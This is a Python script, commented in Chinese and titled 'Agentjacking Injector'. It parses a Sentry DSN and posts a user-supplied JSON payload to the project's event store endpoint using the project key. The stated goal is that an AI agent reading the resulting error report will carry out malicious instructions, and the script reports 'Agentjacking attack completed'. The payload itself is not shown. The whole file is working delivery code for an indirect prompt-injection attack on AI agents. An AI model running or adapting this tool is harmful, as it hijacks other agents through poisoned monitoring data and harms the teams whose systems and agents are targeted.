#!/usr/bin/env python3
"""
Agentjacking Injector
使用 http_client 向 Sentry 发送 payload，触发 Agent 执行恶意指令
"""

import sys
import os
import subprocess
import json

# 通用组件路径
HTTP_CLIENT = os.path.join(os.path.dirname(__file__), "http_client", "http_client.py")

def inject_payload(dsn, payload_file):
    """向 Sentry 注入 payload"""
    
    if not os.path.exists(HTTP_CLIENT):
        print(f"[ERROR] http_client not found: {HTTP_CLIENT}")
        return False
    
    if not os.path.exists(payload_file):
        print(f"[ERROR] Payload file not found: {payload_file}")
        return False
    
    # 解析 DSN 提取 Sentry 接收端点
    # Sentry DSN 格式：https://<key>@<org>.ingest.sentry.io/<project_id>
    if not dsn.startswith("https://"):
        print(f"[ERROR] Invalid DSN format: {dsn}")
        return False
    
    # 构造 Sentry API 端点
    # Sentry 事件接收端点：https://<org>.ingest.sentry.io/api/<project_id>/store/
    try:
        parts = dsn.replace("https://", "").split("@")
        key = parts[0]
        host_and_project = parts[1]
        host = host_and_project.split("/")[0]
        project_id = host_and_project.split("/")[1]
        
        endpoint = f"https://{host}/api/{project_id}/store/"
    except (IndexError, ValueError):
        print(f"[ERROR] Failed to parse DSN: {dsn}")
        return False
    
    print(f"[*] Target endpoint: {endpoint}")
    print(f"[*] Sentry key: {key}")
    
    # 读取 payload
    with open(payload_file, "r") as f:
        payload = json.load(f)
    
    # 调用 http_client 发送 POST 请求
    cmd = [
        sys.executable, HTTP_CLIENT,
        "--method", "POST",
        "--url", endpoint,
        "--header", f"X-Sentry-Auth: Sentry sentry_key={key}, sentry_version=7",
        "--header", "Content-Type: application/json",
        "--body-file", payload_file
    ]
    
    print(f"[*] Injecting payload...")
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    if result.returncode != 0:
        print(f"[ERROR] http_client failed: {result.stderr}")
        return False
    
    print(f"[+] Payload injected successfully")
    print(f"[*] Response:")
    print(result.stdout)
    
    return True

def main():
    if len(sys.argv) < 3:
        print("Usage: python injector.py <dsn> <payload_file>")
        print("Example: python injector.py 'https://key@o123.ingest.sentry.io/456' payload.json")
        sys.exit(1)
    
    dsn = sys.argv[1]
    payload_file = sys.argv[2]
    
    success = inject_payload(dsn, payload_file)
    
    if success:
        print("\n[+] Agentjacking attack completed")
        print("[*] Wait for the Agent to process the error report...")
    else:
        print("\n[-] Agentjacking attack failed")
        sys.exit(1)

if __name__ == "__main__":
    main()